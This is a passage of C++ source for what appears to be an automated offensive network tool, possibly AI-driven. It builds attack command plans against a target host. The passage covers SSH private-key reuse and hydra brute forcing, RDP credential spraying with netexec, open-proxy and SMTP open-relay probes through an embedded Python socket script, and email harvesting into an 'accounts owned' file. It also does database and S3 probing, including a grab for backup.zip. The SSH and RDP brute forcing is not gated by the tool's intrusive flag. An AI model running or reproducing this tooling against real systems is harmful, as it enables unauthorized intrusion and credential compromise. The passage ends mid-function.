// --------------------------- Flows : SSH BRUTE / KEYS -------------------------
static std::vector<fs::path> net_find_private_keys(const fs::path& workdir){
    std::vector<fs::path> out;
    for (auto &e : fs::recursive_directory_iterator(workdir)) {
        if (!e.is_regular_file()) continue;
        std::string n = net_to_lower(e.path().filename().string());
        if (n.find(".pem")!=std::string::npos || n.find("_rsa")!=std::string::npos || n.find(".key")!=std::string::npos) {
            out.push_back(e.path());
        } else {
            // détecter clé privée OpenSSH
            std::string s = net_slurp_if_exists(e.path());
            if (s.find("-----BEGIN OPENSSH PRIVATE KEY-----") != std::string::npos) out.push_back(e.path());
        }
    }
    return out;
}

static void append_ssh_brute_keyreuse_cmds(const std::string& baseurl,
                                           const fs::path& workdir,
                                           const nlohmann::json& trig,
                                           std::vector<ConfirmationCommand>& plan,
                                           nlohmann::json& plan_json)
{
    if (!trig.value("has_ssh",false)) return;
    const std::string host = trig.value("host", extract_hostname(baseurl));

    // 1) KEY REUSE: tester clés privées trouvées
    auto keys = net_find_private_keys(workdir);
#ifndef _WIN32
    if (!keys.empty()) {
        nlohmann::json vault = load_creds_vault(workdir);
        auto users = build_contextual_usernames(host, vault);
        uniq_prune(users, 20);

        int idx=0;
        for (auto& k : keys) {
            for (auto& u : users) {
                std::ostringstream cmd;
                cmd << "ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 -i \""<<k.string()
                    <<"\" " << u << "@" << host << " true";
                fs::path out = workdir/("ssh_keyreuse_"+std::to_string(idx)+".txt");
                add_net_flow(plan, plan_json, "FLOW_SSH_KEY_REUSE_"+std::to_string(idx),
                             "SSH key-reuse test avec "+k.filename().string()+" / user "+u,
                             cmd.str(), out, {{"user",u},{"key",k.string()}});
                ++idx;
            }
        }
    }
#endif

#ifndef _WIN32
    // 2) BRUTE SOFT via hydra si dispo
    const std::string have_hydra = net_check_bin("hydra");
    if (!have_hydra.empty()) {
        nlohmann::json vault = load_creds_vault(workdir);
        auto users = build_contextual_usernames(host, vault);
        auto passw = build_contextual_passwords(host, /*surfaces*/ nlohmann::json::object(), workdir);
        uniq_prune(users, 30);
        uniq_prune(passw, 100);

        fs::path ufile = workdir/"ssh_users_spray.txt";
        fs::path pfile = workdir/"ssh_pass_spray.txt";
        { std::ofstream uf(ufile); for (auto& u: users) uf << u << "\n";
          std::ofstream pf(pfile); for (auto& p: passw) pf << p << "\n"; }

        int port = 22;
        if (trig["ports"]["ssh"].is_array() && !trig["ports"]["ssh"].empty())
            port = trig["ports"]["ssh"][0].get<int>();

        std::ostringstream cmd;
        cmd << "hydra -L \""<< ufile.string() <<"\" -P \""<< pfile.string()
            << "\" -t 4 -W 3 -s " << port
            << " ssh://" << host
            << " -o \"" << (workdir/("ssh_hydra.txt")).string() << "\"";
        add_net_flow(plan, plan_json,
                     "FLOW_SSH_BRUTE",
                     "SSH brute soft via hydra ("+host+":"+std::to_string(port)+")",
                     cmd.str(),
                     workdir/"FLOW_SSH_BRUTE.txt",
                     {{"host",host},{"port",port}});
    } else
#endif
    {
        add_net_flow(plan, plan_json, "FLOW_SSH_NOTE",
                     "SSH détecté — hydra non disponible, brute non lancé (key reuse tenté si clés trouvées).",
                     "echo 'SSH detected' ; true", workdir/"ssh_note.txt", {{"host",host}});
    }
}

// --------------------------- Flows : RDP ENUM / BRUTE -------------------------
static void append_rdp_enum_brute_cmds(const std::string& baseurl,
                                       const fs::path& workdir,
                                       const nlohmann::json& trig,
                                       std::vector<ConfirmationCommand>& plan,
                                       nlohmann::json& plan_json)
{
    if (!trig.value("has_rdp",false)) return;
    const std::string host = trig.value("host", extract_hostname(baseurl));
#ifndef _WIN32
    // netexec (ex-crackmapexec) si dispo
    const std::string have_ne = net_check_bin("netexec");
    if (!have_ne.empty()) {
        // Spray léger à partir du vault uniquement (pour limiter)
        nlohmann::json vault = load_creds_vault(workdir);
        std::vector<std::pair<std::string,std::string>> pairs;
        if (vault.contains("creds") && vault["creds"].is_array()) {
            for (auto& c : vault["creds"]) {
                std::string u = c.value("username","");
                std::string p = c.value("password","");
                if (!u.empty() && !p.empty()) pairs.emplace_back(u,p);
            }
        }
        if (pairs.size() > 40) pairs.resize(40);

        fs::path cfile = workdir/"rdp_creds_spray.txt";
        { std::ofstream cf(cfile); for (auto& pr: pairs) cf << pr.first << ":" << pr.second << "\n"; }

        std::ostringstream cmd;
        cmd << "netexec rdp " << host << " -u \""<< cfile.string() <<"\" -p \""<< cfile.string() <<"\" --continue-on-success";
        add_net_flow(plan, plan_json, "FLOW_RDP_BRUTE",
                     "RDP brute (soft) via netexec sur "+host,
                     cmd.str(), workdir/"FLOW_RDP_BRUTE.txt", {{"host",host}});
    } else
#endif
    {
        add_net_flow(plan, plan_json, "FLOW_RDP_ENUM",
                     "RDP détecté — netexec indisponible, enum minimale (NLA non vérifiée).",
                     "echo 'RDP detected on host' ; true", workdir/"rdp_enum_note.txt", {{"host",host}});
    }
}

// --------------------------- Flows : PROXY OPEN RELAY -------------------------
static void append_proxy_openrelay_cmds(const std::string& baseurl,
                                        const fs::path& workdir,
                                        const nlohmann::json& trig,
                                        std::vector<ConfirmationCommand>& plan,
                                        nlohmann::json& plan_json)
{
    const std::string host = trig.value("host", extract_hostname(baseurl));
    // HTTP CONNECT
    if (trig.value("has_http_proxy",false)) {
        int port = 3128;
        if (trig["ports"]["httpproxy"].is_array() && !trig["ports"]["httpproxy"].empty())
            port = trig["ports"]["httpproxy"][0].get<int>();

        std::ostringstream cmd;
        cmd << "curl -skI --max-time 8 --proxy http://" << host << ":"<<port<<" https://1.1.1.1/ ; "
            << "curl -skI --max-time 8 --proxy http://" << host << ":"<<port<<" https://example.com/";
        add_net_flow(plan, plan_json, "FLOW_PROXY_OPENRELAY_HTTP",
                     "HTTP proxy CONNECT test (sortie Internet) via curl",
                     cmd.str(), workdir/"FLOW_PROXY_OPENRELAY_HTTP.txt",
                     {{"host",host},{"port",port}});
    }

    // SOCKS5
    if (trig.value("has_socks",false)) {
        int port = 1080;
        if (trig["ports"]["socks"].is_array() && !trig["ports"]["socks"].empty())
            port = trig["ports"]["socks"][0].get<int>();

        std::ostringstream cmd;
        cmd << "curl -skI --max-time 8 --socks5 " << host << ":"<<port<<" https://1.1.1.1/ ; "
            << "curl -skI --max-time 8 --socks5 " << host << ":"<<port<<" https://example.com/";
        add_net_flow(plan, plan_json, "FLOW_PROXY_OPENRELAY_SOCKS",
                     "SOCKS5 proxy test (sortie Internet) via curl",
                     cmd.str(), workdir/"FLOW_PROXY_OPENRELAY_SOCKS.txt",
                     {{"host",host},{"port",port}});
    }
}

// -------------------------- AJOUT : MAIL (SMTP/IMAP/POP3/SPF/DKIM/DMARC) --------------------------
// Safe-by-default mail surface detection + analysis.
// Intrusive modules (open-relay test, minimal mailbox pivots) gated by g_intrusive_mode
// Requires: #include <sys/socket.h> <netdb.h> on POSIX - use existing run_command_capture if preferred.

// Globals (déclare près des autres globals en haut du fichier)
static std::string g_lab_sender_domain = "";     // set via --lab-sender or env LAB_SENDER_DOMAIN

// Helper: add_mail_flow (pattern like add_db_flow/add_net_flow)
static void add_mail_flow(std::vector<ConfirmationCommand>& plan,
                          nlohmann::json& plan_json,
                          const std::string& id,
                          const std::string& desc,
                          const std::string& cmd,
                          const fs::path& outfile,
                          const nlohmann::json& meta = {}) {
    ConfirmationCommand c;
    c.id = id;
    c.description = desc;
    c.command = cmd;
    c.outfile = outfile;
    add_unique_cmd(plan, c);
    nlohmann::json m = meta;
    plan_json["flows"].push_back({
        {"id", id}, {"description", desc}, {"command", cmd},
        {"outfile", outfile.string()}, {"meta", m}
    });
}

// Small cross-platform socket helper (POSIX). returns "<code> <line...>"
static std::string smtp_socket_exchange(const std::string& host, int port, const std::vector<std::string>& sends, int timeout_ms=8000) {
#if defined(_WIN32)
    (void)host; (void)port; (void)sends; (void)timeout_ms;
    return "NOT_IMPLEMENTED_ON_WINDOWS";
#else
    std::ostringstream out;
    struct addrinfo hints{}, *res = nullptr;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_UNSPEC;
    char portbuf[8]; snprintf(portbuf, sizeof(portbuf), "%d", port);
    if (getaddrinfo(host.c_str(), portbuf, &hints, &res) != 0) {
        out << "ERR getaddrinfo\n"; return out.str();
    }
    int sfd = -1;
    for (struct addrinfo* rp = res; rp; rp = rp->ai_next) {
        sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sfd < 0) continue;
        // set timeout
        struct timeval tv; tv.tv_sec = timeout_ms/1000; tv.tv_usec = (timeout_ms%1000)*1000;
        setsockopt(sfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
        setsockopt(sfd, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
        if (connect(sfd, rp->ai_addr, rp->ai_addrlen) == 0) break;
        close(sfd); sfd = -1;
    }
    freeaddrinfo(res);
    if (sfd < 0) { out << "ERR connect\n"; return out.str(); }

    auto recvline = [&](int fd)->std::string {
        std::string s;
        char buf[1024];
        ssize_t r = recv(fd, buf, sizeof(buf)-1, 0);
        if (r <= 0) return s;
        buf[r]=0; s = std::string(buf);
        return s;
    };

    // read banner
    std::string banner = recvline(sfd);
    out << "BANNER: " << banner << "\n";

    for (auto &cmd : sends) {
        std::string tosend = cmd + "\r\n";
        ssize_t w = send(sfd, tosend.c_str(), (int)tosend.size(), 0);
        if (w < 0) { out << "ERR send\n"; break; }
        // read reply
        std::string reply = recvline(sfd);
        out << "=> " << cmd << "\n";
        out << "<= " << reply << "\n";
    }
    close(sfd);
    return out.str();
#endif
}

// Realistic open-relay test (lightweight): connect, EHLO, MAIL FROM:<lab@lab-domain>, RCPT TO:<external>
// returns JSON string (evidence) to be saved in smtp_open_relay_evidence file
static nlohmann::json smtp_test_open_relay(const std::string& host, int port, const std::string& lab_sender, const std::string& external_recipient) {
    using json = nlohmann::json;
    json j;
    j["host"] = host;
    j["port"] = port;
    j["lab_sender"] = lab_sender;
    j["external_recipient"] = external_recipient;
    j["timestamp"] = current_datetime_string();

    std::vector<std::string> seq;
    seq.push_back("EHLO test.local");
    // MAIL FROM and RCPT TO but DO NOT send DATA - we only want acceptance codes
    seq.push_back(std::string("MAIL FROM:<") + lab_sender + ">");
    seq.push_back(std::string("RCPT TO:<") + external_recipient + ">");
    // QUIT
    seq.push_back("QUIT");

    std::string raw = smtp_socket_exchange(host, port, seq, 8000);
    j["raw_exchange"] = raw;
    // crude heuristic: if RCPT reply contains 250 or 2xx -> accepted; 550/5xx -> refused
    std::string low = net_to_lower(raw);
    bool accepted = (low.find(" 250 ") != std::string::npos || low.find("250-") != std::string::npos || low.find(" 2")!=std::string::npos);
    bool rejected = (low.find(" 550 ") != std::string::npos || low.find(" 5")!=std::string::npos);
    j["probable_accept"] = accepted && !rejected;
    return j;
}

// Harvest mail triggers (reads recon artefacts already produced by naabu/zgrab2/nuclei/httpx)
static nlohmann::json harvest_mail_triggers(const std::string& baseurl, const fs::path& workdir) {
    using json = nlohmann::json;
    json j;
    j["host"] = extract_hostname(baseurl);

    fs::path last_naabu = find_newest_file_containing(workdir, "naabu");
    std::set<int> ports = parse_naabu_ports(last_naabu.empty() ? workdir / "recon_naabu_all.txt" : last_naabu);
    j["ports_open"] = std::vector<int>(ports.begin(), ports.end());

    std::string banners = net_to_lower(
          net_slurp_if_exists(workdir/"recon_httpx.txt")
        + "\n" + net_slurp_if_exists(workdir/"recon_whatweb_verbose.log")
        + "\n" + net_slurp_if_exists(workdir/"recon_zgrab2_banner.txt")
        + "\n" + net_slurp_if_exists(workdir/"nuclei_results.txt")
    );

    j["has_smtp"]       = (ports.count(25) > 0)  || (banners.find("smtp")!=std::string::npos) || (banners.find("esmtp")!=std::string::npos);
    j["has_smtps"]      = (ports.count(465) > 0) || (banners.find("smtps")!=std::string::npos);
    j["has_submission"] = (ports.count(587) > 0);
    j["has_imap"]       = (ports.count(143) > 0) || (ports.count(993) > 0) || (banners.find("imap")!=std::string::npos);
    j["has_pop3"]       = (ports.count(110) > 0) || (ports.count(995) > 0) || (banners.find("pop3")!=std::string::npos);

    std::string httpdump = net_to_lower(net_slurp_if_exists(workdir/"recon_httpx.txt") + "\n" + net_slurp_if_exists(workdir/"recon_katana_urls_ok.txt"));
    j["has_spf_record_hint"] = (httpdump.find("v=spf1") != std::string::npos);
    j["has_dkim_hint"]       = (httpdump.find("dkim") != std::string::npos);
    j["has_dmarc_hint"]      = (httpdump.find("_dmarc") != std::string::npos);

    // collect candidate email addresses found in recon artifacts
    std::vector<std::string> cand_emails;
    for (auto &f : glob_files(workdir, "recon_*")) {
        std::string txt = net_slurp_if_exists(f);
        if (txt.empty()) continue;
        std::regex re(R"(([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}))");
        std::smatch m;
        std::string::const_iterator s(txt.cbegin());
        while (std::regex_search(s, txt.cend(), m, re)) {
            cand_emails.push_back(m[1].str());
            s = m.suffix().first;
        }
    }
    uniq_prune(cand_emails, 500);
    j["candidate_emails"] = cand_emails;
    return j;
}

// Append mail flows to the plan. Non-intrusive flows always added. Intrusive tests gated by g_intrusive_mode
static void append_mail_flows(const std::string& baseurl,
                              const fs::path& workdir,
                              std::vector<ConfirmationCommand>& plan,
                              nlohmann::json& plan_json) {
    using json = nlohmann::json;
    json trig = harvest_mail_triggers(baseurl, workdir);
    plan_json["mail_triggers"] = trig;

    const std::string host = trig.value("host", extract_hostname(baseurl));
    auto ports = trig.value("ports_open", std::vector<int>{});

    // 1) Mail banner aggregation (zgrab2) non-intrusive
    for (int p : {25, 465, 587, 110, 995, 143, 993}) {
        if (std::find(ports.begin(), ports.end(), p) == ports.end()) continue;
        fs::path out = workdir / ("FLOW_MAIL_BANNER_" + std::to_string(p) + ".txt");
        std::ostringstream cmd;
        if (p == 25 || p == 587) {
            cmd << "zgrab2 smtp --port " << p << " --timeout 6 --output-file '" << out.string() << "' " << host
                << " || echo \"(no zgrab2 smtp)\" > '" << out.string() << "'";
        } else if (p == 465 || p == 993 || p == 995) {
            // s_client fallback for SMTPS/IMAPS/POP3S
            cmd << "echo 'TLS service probe' > '" << out.string() << "'"; 
        } else {
            cmd << "zgrab2 smtp --port " << p << " --timeout 6 --output-file '" << out.string() << "' " << host
                << " || true";
        }
        add_mail_flow(plan, plan_json, "FLOW_MAIL_BANNER_" + std::to_string(p),
                      "Mail banner check port " + std::to_string(p),
                      cmd.str(), out, {{"port",p}});
    }

    // 2) SPF/DKIM/DMARC hint extraction (non-intrusive) -> scan recon files
    fs::path spf_out = workdir / "FLOW_MAIL_SPF_DKIM_HINTS.txt";
    {
        std::ostringstream cmd;
        cmd << "echo 'Extract SPF/DKIM/DMARC hints from collected recon files'; ";
        cmd << "grep -i \"v=spf1\\|_dmarc\\|dkim\" '" << (workdir/"recon_httpx.txt").string() << "' > '" << spf_out.string() << "' 2>/dev/null || true";
        add_mail_flow(plan, plan_json, "FLOW_MAIL_SPF_HINTS",
                      "SPF/DKIM/DMARC hints from collected artifacts (non-intrusive)",
                      cmd.str(), spf_out, {});
    }

    // 3) Open-relay heuristic (aggregate nuclei / zgrab evidence)
    fs::path relay_out = workdir / "smtp_open_relay_evidence.txt";
    {
        std::ostringstream cmd;
        cmd << "grep -i 'open relay\\|relay accepted\\|relay' '" << (workdir/"nuclei_results.txt").string() << "' > '" << relay_out.string() << "' || true";
        add_mail_flow(plan, plan_json, "FLOW_SMTP_OPENRELAY_HEUR",
                      "SMTP open-relay heuristic scan (from nuclei/zgrab/httpx artefacts) - non-intrusive",
                      cmd.str(), relay_out, {});
    }

    // 4) Intrusive open-relay check (socket-based SMTP sequence) - gated and requires lab domain
    if (g_intrusive_mode) {
        if (g_lab_sender_domain.empty()) {
            // Write a placeholder note reminding user to set lab sender domain
            fs::path out_note = workdir / "FLOW_SMTP_OPENRELAY_PLACEHOLDER.txt";
            std::ostringstream cmd;
            cmd << "echo 'INTRUSIVE: lab sender domain not set. Use --lab-sender to enable real open-relay tests.' > '" << out_note.string() << "'";
            add_mail_flow(plan, plan_json, "FLOW_SMTP_OPENRELAY_PLACEHOLDER",
                          "SMTP open-relay intrusive placeholder (lab sender missing)", cmd.str(), out_note, {{"warning","MISSING_LAB_SENDER"}});
        } else {
            // Build a tiny python runner that will call the smtp_test_open_relay via CLI (or use internal function via compile-time)
            fs::path out = workdir / "smtp_open_relay_evidence_runtime.json";
            std::ostringstream cmd;
            // prefer to call an internal binary path that triggers this tool's function; fallback to placeholder that triggers a small python probe
            cmd << "python3 - <<'PY' > '" << out.string() << "' 2>&1\n"
                   "import socket,sys, json\n"
                   "host = '" << host << "'\n"
                   "port = 25\n"
                   "def probe(h,p):\n"
                   " s=socket.socket(); s.settimeout(8)\n"
                   " try:\n"
                   "  s.connect((h,p));\n"
                   "  data=s.recv(65536).decode(errors='ignore')\n"
                   "  s.send(b'EHLO probe.example\\r\\n')\n"
                   "  r=s.recv(65536).decode(errors='ignore')\n"
                   "  s.send(b'MAIL FROM:<test@" << g_lab_sender_domain << ">\\r\\n')\n"
                   "  r2=s.recv(65536).decode(errors='ignore')\n"
                   "  s.send(b'RCPT TO:<external@external.test>\\r\\n')\n"
                   "  r3=s.recv(65536).decode(errors='ignore')\n"
                   "  s.send(b'QUIT\\r\\n')\n"
                   "  s.close()\n"
                   "  print(json.dumps({'host':h,'port':p,'banner':data,'mail_resp':r2,'rcpt_resp':r3}))\n"
                   " except Exception as e:\n"
                   "  print(json.dumps({'err':str(e)}))\n"
                   "PY\n";
            add_mail_flow(plan, plan_json, "FLOW_SMTP_OPEN_RELAY_INTRUSIVE",
                         "SMTP open-relay intrusive probe (gated by --intrusive + --lab-sender)", cmd.str(), out, {{"host",host},{"lab_sender",g_lab_sender_domain}});
        }
    } else {
        // Non-intrusive placeholder indicating how to enable
        fs::path out = workdir / "FLOW_SMTP_OPENRELAY_DISABLED.txt";
        std::ostringstream cmd; cmd << "echo 'Open-relay intrusive tests are disabled. Use --intrusive --lab-sender <domain> to enable.' > '" << out.string() << "'";
        add_mail_flow(plan, plan_json, "FLOW_SMTP_OPENRELAY_DISABLED",
                      "Open-relay intrusive tests disabled by default", cmd.str(), out, {});
    }

    // 5) Brute / spray placeholder (explicitly intrusive)
    if (g_intrusive_mode) {
        fs::path out = workdir / "FLOW_MAIL_BRUTE_PLACEHOLDER.txt";
        std::ostringstream cmd;
        cmd << "echo 'INTRUSIVE_MAIL_BRUTE: placeholder. This module would run auth spray/hydra against IMAP/POP/SMTP if enabled and authorised.' > '" << out.string() << "'";
        add_mail_flow(plan, plan_json, "FLOW_MAIL_BRUTE_PLACEHOLDER",
                      "MAIL brute/spray (INTRUSIVE - placeholder only)", cmd.str(), out,
                      {{"warning","INTRUSIVE_PLACEHOLDER"}});
    } else {
        fs::path out = workdir / "FLOW_MAIL_BRUTE_DISABLED.txt";
        std::ostringstream cmd; cmd << "echo 'Mail brute disabled (use --intrusive)'> '" << out.string() << "'";
        add_mail_flow(plan, plan_json, "FLOW_MAIL_BRUTE_DISABLED",
                      "Mail brute disabled by default", cmd.str(), out, {});
    }

    // 6) Pivot placeholder (only placeholder, real pivot requires authorised mailbox access)
    fs::path pivot_out = workdir / "FLOW_MAIL_PIVOT_PLACEHOLDER.txt";
    {
        std::ostringstream cmd;
        cmd << "echo 'MAIL_PIVOT: placeholder for mailbox pivot automation - requires full authorisation and vaulted creds' > '" << pivot_out.string() << "'";
        add_mail_flow(plan, plan_json, "FLOW_MAIL_PIVOT_PLACEHOLDER",
                      "MAIL account pivot (INTRUSIVE - placeholder only)", cmd.str(), pivot_out,
                      {{"warning","INTRUSIVE_PLACEHOLDER"}});
    }
}

// Analyze mail flow outputs and produce structured JSON summaries (non-intrusive)
static void analyse_postexploit_results_mail(const std::string& baseurl, const fs::path& workdir) {
    using json = nlohmann::json;

    json j_relay = json::object();
    j_relay["generated_at"] = current_datetime_string();
    j_relay["evidence"] = json::array();

    for (auto &f : glob_files(workdir, "smtp_open_relay_evidence")) {
        std::string txt = net_slurp_if_exists(f);
        bool probable = net_to_lower(txt).find("open relay") != std::string::npos || net_to_lower(txt).find("relay") != std::string::npos || net_to_lower(txt).find("mail_resp")!=std::string::npos;
        j_relay["evidence"].push_back({{"file", f.filename().string()}, {"snippet", txt.substr(0,512)}, {"probable_open_relay", probable}});
    }
    try { std::ofstream(workdir/"smtp_open_relay.txt") << j_relay.dump(2); } catch(...) {}

    json j_accounts = json::object();
    j_accounts["generated_at"] = current_datetime_string();
    j_accounts["owned"] = json::array();

    // parse placeholders and any prior hydra-like outputs (if they exist)
    for (auto &f : glob_files(workdir, "FLOW_MAIL_BRUTE_PLACEHOLDER")) {
        std::string txt = net_slurp_if_exists(f);
        if (txt.empty()) continue;
        j_accounts["owned"].push_back({{"file", f.filename().string()}, {"note", "placeholder - brute not executed"}});
    }
    // try to collect candidate emails from postexploit_plan_web.json / recon files
    fs::path harvest = workdir / "postexploit_plan_web.json";
    if (fs::exists(harvest)) {
        try {
            std::string plantxt = readFile(harvest.string());
            std::regex re(R"(([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}))");
            std::smatch m; std::string::const_iterator s(plantxt.cbegin());
            while (std::regex_search(s, plantxt.cend(), m, re)) {
                j_accounts["owned"].push_back({{"candidate_email", m[1].str()}, {"source","postexploit_plan"}});
                s = m.suffix().first;
            }
        } catch(...) {}
    }
    try { std::ofstream(workdir/"mail_accounts_owned.json") << j_accounts.dump(2); } catch(...) {}

    json j_pivot = json::object();
    j_pivot["generated_at"] = current_datetime_string();
    j_pivot["candidates"] = json::array();
    for (auto &f : glob_files(workdir, "recon_katana_urls_ok.txt")) {
        std::string txt = net_slurp_if_exists(f);
        std::istringstream iss(txt); std::string line;
        while (std::getline(iss, line)) {
            if (icontains(line, "password") || icontains(line, "reset") || icontains(line, "recover")) {
                j_pivot["candidates"].push_back({{"url", trim_copy(line)}});
            }
        }
    }
    try { std::ofstream(workdir/"mail_pivot_candidates.json") << j_pivot.dump(2); } catch(...) {}

    loginfo("[AI] MAIL: analysis complete. Outputs: smtp_open_relay.txt, mail_accounts_owned.json, mail_pivot_candidates.json");
}

// -------------------------- AJOUT: DB / Storage / Metrics / Cache Flows --------------------------
// Insert this block into agentfactory.cpp (somewhere near append_net_flows / run_postexploit_web_phase)
// It defines: a global intrusive flag, parsing CLI addition, harvest_db_triggers,
// append_db_flows(...), analyse_postexploit_results_db(...), et intégration dans la pipeline.

// 1) Global flag (place with other globals near top)

// 2) Extend CLIOptions parsing: add field in struct CLIOptions (near other flags)
    // add inside CLIOptions struct:
    // bool intrusive = false; // set by --intrusive
// and add parsing in parse_cli(...) loop:
// else if (a == "--intrusive") c.intrusive = true;

// If you prefer a patch approach: add the line 'bool intrusive = false;' inside CLIOptions definition
// and inside parse_cli add:
// else if (a == "--intrusive") c.intrusive = true;

// 3) In main(), after CLI parsing set global:
// g_intrusive_mode = cli.intrusive;

// 4) Below: helper functions for DB flows & analysis

static nlohmann::json harvest_db_triggers(const std::string& baseurl, const fs::path& workdir) {
    using json = nlohmann::json;
    json j;
    j["host"] = extract_hostname(baseurl);

    // ports discovered by naabu (best-effort)
    fs::path last_naabu = find_newest_file_containing(workdir, "naabu");
    std::set<int> ports = parse_naabu_ports(last_naabu.empty() ? workdir / "recon_naabu_all.txt" : last_naabu);
    j["ports_open"] = std::vector<int>(ports.begin(), ports.end());

    // banners / zgrab2/httpx output
    std::string banners = net_to_lower(net_slurp_if_exists(workdir/"recon_httpx.txt")
                                     + "\n" + net_slurp_if_exists(workdir/"recon_whatweb_verbose.log")
                                     + "\n" + net_slurp_if_exists(workdir/"recon_zgrab2_banner.txt"));

    auto detect_http_s3 = [&](const std::string &txt)->bool {
        return txt.find("amazon s3") != std::string::npos ||
               txt.find("minio") != std::string::npos ||
               txt.find("s3") != std::string::npos ||
               txt.find("object storage") != std::string::npos ||
               txt.find("aws s3") != std::string::npos;
    };

    // flags
    j["has_mysql"]      = (ports.count(3306) > 0) || (banners.find("mysql")!=std::string::npos);
    j["has_postgres"]   = (ports.count(5432) > 0) || (banners.find("postgres")!=std::string::npos);
    j["has_mssql"]      = (ports.count(1433) > 0) || (banners.find("microsoft-sql")!=std::string::npos);
    j["has_oracle"]     = (ports.count(1521) > 0) || (banners.find("oracle")!=std::string::npos);
    j["has_mongo"]      = (ports.count(27017) > 0) || (banners.find("mongodb")!=std::string::npos);
    j["has_cassandra"]  = (ports.count(9042) > 0) || (banners.find("cassandra")!=std::string::npos);
    j["has_redis"]      = (ports.count(6379) > 0) || (banners.find("redis")!=std::string::npos);
    j["has_memcached"]  = (ports.count(11211) > 0) || (banners.find("memcached")!=std::string::npos);
    j["has_elastic"]    = (ports.count(9200) > 0) || (banners.find("elasticsearch")!=std::string::npos);
    j["has_solr"]       = (ports.count(8983) > 0) || (banners.find("solr")!=std::string::npos);
    j["has_prometheus"] = (ports.count(9090) > 0) || (banners.find("prometheus")!=std::string::npos);
    j["has_influxdb"]   = (ports.count(8086) > 0) || (banners.find("influxdb")!=std::string::npos);

    // object storage detection from HTTP banners
    j["has_s3_like"] = false;
    for (auto &f : glob_files(workdir, "recon_zgrab2_http_")) {
        std::string txt = net_to_lower(net_slurp_if_exists(f));
        if (detect_http_s3(txt)) { j["has_s3_like"] = true; break; }
    }
    // quick check for common S3 ports
    if (!j["has_s3_like"].get<bool>()) {
        for (int p : {443,8443,9000}) if (ports.count(p)) j["has_s3_like"] = true;
    }

    // collect candidate endpoints discovered by httpx / katana / wayback (for S3-ish endpoints or admin consoles)
    json candidates = json::object();
    candidates["http_urls"] = json::array();
    for (auto &f : glob_files(workdir, "recon_katana_urls_ok.txt")) {
        std::string txt = net_slurp_if_exists(f);
        std::istringstream iss(txt); std::string line;
        while (std::getline(iss, line)) {
            line = trim_copy(line);
            if (!line.empty()) candidates["http_urls"].push_back(line);
        }
    }
    for (auto &f : glob_files(workdir, "recon_waybackurls.txt")) {
        std::string txt = net_slurp_if_exists(f);
        std::istringstream iss(txt); std::string line;
        while (std::getline(iss, line)) {
            line = trim_copy(line);
            if (!line.empty()) candidates["http_urls"].push_back(line);
        }
    }
    j["candidates"] = candidates;
    return j;
}

// Helper: add_db_flow wrapper (reuses pattern add_net_flow/add_api_flow)
static void add_db_flow(std::vector<ConfirmationCommand>& plan,
                        nlohmann::json& plan_json,
                        const std::string& id,
                        const std::string& desc,
                        const std::string& cmd,
                        const fs::path& outfile,
                        const nlohmann::json& meta = {}) {
    ConfirmationCommand c;
    c.id = id;
    c.description = desc;
    c.command = cmd;
    c.outfile = outfile;
    add_unique_cmd(plan, c);
    nlohmann::json m = meta;
    plan_json["flows"].push_back({
        {"id", id}, {"description", desc}, {"command", cmd},
        {"outfile", outfile.string()}, {"meta", m}
    });
}

// append_db_flows: construct plan entries for DB, S3, Redis, Elastic, Metrics...
static void append_db_flows(const std::string& baseurl,
                            const fs::path& workdir,
                            std::vector<ConfirmationCommand>& plan,
                            nlohmann::json& plan_json) {
    using json = nlohmann::json;
    json trig = harvest_db_triggers(baseurl, workdir);
    plan_json["db_triggers"] = trig;

    const std::string host = trig.value("host", extract_hostname(baseurl));
    auto ports = trig.value("ports_open", std::vector<int>{});

    // 1) Non-intrusive checks (always)
    int idx = 0;

    // MySQL / Postgres / Mssql banner via zgrab2 (best-effort)
    for (int p : {3306, 5432, 1433, 1521, 27017, 9042, 6379, 11211, 9200, 8983, 9090, 8086}) {
        if (std::find(ports.begin(), ports.end(), p) == ports.end()) continue;
        fs::path out = workdir / ("FLOW_DB_BANNER_" + std::to_string(p) + ".txt");
        std::ostringstream cmd;
        // Use zgrab2 modules when possible
        std::string module = (p==3306?"mysql": (p==5432?"postgres": (p==1433?"mssql": (p==27017?"mongodb": (p==6379?"redis":"banner")))));
        if (module == "banner") {
            cmd << "zgrab2 banner --port " << p << " --timeout 5 --output-file '" << out.string() << "' " << host;
        } else {
            cmd << "zgrab2 " << module << " --port " << p << " --timeout 5 --output-file '" << out.string() << "' " << host;
        }
        add_db_flow(plan, plan_json,
                    "FLOW_DB_BANNER_" + std::to_string(p),
                    "DB banner check port " + std::to_string(p),
                    cmd.str(), out, {{"port", p}});
        ++idx;
    }

    // S3-like listing attempt (non-intrusive): GET /?list-type=2 and HEAD object
    if (trig.value("has_s3_like", false)) {
        fs::path out1 = workdir / "FLOW_S3_LIST.txt";
        fs::path out2 = workdir / "FLOW_S3_GETOBJ.txt";
        std::string candidate_url = extract_hostname(baseurl);
        // try common object keys
        std::ostringstream cmd1;
        cmd1 << "curl -sk --max-time 8 \"" << "https://" << candidate_url << "/?list-type=2\" -D - -o '" << out1.string() << "'";
        std::ostringstream cmd2;
        cmd2 << "curl -sk --max-time 8 \"" << "https://" << candidate_url << "/backup.zip\" -I -o '" << out2.string() << "'";
        add_db_flow(plan, plan_json, "FLOW_S3_CHECK_LIST", "S3/MinIO listing candidate (HEAD & list)", cmd1.str(), out1, {{"url","https://"+candidate_url}});
        add_db_flow(plan, plan_json, "FLOW_S3_CHECK_OBJ", "S3 object GET/HEAD candidate (backup.zip)", cmd2.str(), out2, {{"url","https://"+candidate_url}});
    }

    // Redis / Memcached noauth checks (non-intrusive: INFO/CONFIG GET)
    if (trig.value("has_redis", false)) {
        int port = 6379;
        fs::path out = workdir / "FLOW_REDIS_INFO.txt";
        std::ostringstream cmd;
        cmd << "zgrab2 redis --port " << port << " --timeout 5 --output-file '" << out.string() << "' " << host;
        add_db_flow(plan, plan_json, "FLOW_REDIS_INFO", "Redis banner/INFO (non-intrusive)", cmd.str(), out, {{"port",port}});
    }
    if (trig.value("has_memcached", false)) {
        int port = 11211;
